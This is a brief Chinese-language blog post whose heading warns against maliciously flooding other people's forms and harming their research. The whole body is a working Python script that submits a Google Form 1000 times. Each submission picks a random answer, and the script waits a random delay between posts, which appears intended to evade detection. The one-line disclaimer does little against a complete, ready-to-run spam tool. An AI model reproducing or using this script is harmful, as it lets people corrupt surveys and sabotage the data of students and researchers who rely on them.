---
description: 灌爆別人的表單？
title: 臺灣高中職生活網賽python
pubDate: 2024/3/16 16:05:02
tags:
  -  不知道
categories:
    - Daily
---
# **不要惡意去刷別人的表單進而去影響別人**

👎 不要殘害別人小論文

```python
import re
import time
import random
import numpy as np
import requests as rq

url = '填入表單連結'
params = ['這邊填欄位名稱']
payload = {
    'entry.361687657' : '',
    'fvv' : '1',
    'draftResponse' : '[]',
    'pageHistory' : '0',
    'fbzx' : '1140157478353573082'
}

num = 1000
period = np.arange(0.5, 5.0, 0.1)
delay = 0.1
while num > 0:
    try:
        payload['entry.361687657'] = random.choice(params)
        res = rq.post(url, data=payload)
        res.raise_for_status()
        if res.status_code == 200 :
            delay = round(random.choice(period), 2)
            print('Fill Out : ' 'f{num}' + payload['entry.361687657'] + ' delay : ' + str(delay) + ' sec')
            time.sleep(delay)
    except rq.HTTPError:
        print('HTTP Error!')
    
    num -= 1

```
